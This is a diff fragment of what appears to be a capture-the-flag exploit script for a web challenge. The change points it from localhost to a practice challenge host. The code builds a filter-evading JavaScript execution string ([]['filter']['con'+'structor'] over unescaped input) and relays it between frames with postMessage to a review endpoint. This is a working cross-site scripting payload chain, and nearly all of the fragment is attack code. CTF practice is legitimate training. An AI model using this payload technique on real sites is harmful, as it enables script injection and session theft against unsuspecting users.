@@ -20,7 +20,7 @@ window.addEventListener('DOMContentLoaded', function() {
   const formula = "[]['filter']['con'+'structor'](unescape('" + enc + "'))()";
 
   onmessage = function(e) {
-    location = "http://localhost:5000/review?widget=" + encodeURIComponent(e.data);
+    location = "host3.dreamhack.games:14348/review?widget=" + encodeURIComponent(e.data);
   };
 
   const innerScript = "setTimeout(function(){p.contentWindow.postMessage(" + JSON.stringify(formula) + ",'*')},2000);onmessage=function(e){top.postMessage(e.data,'*')};";
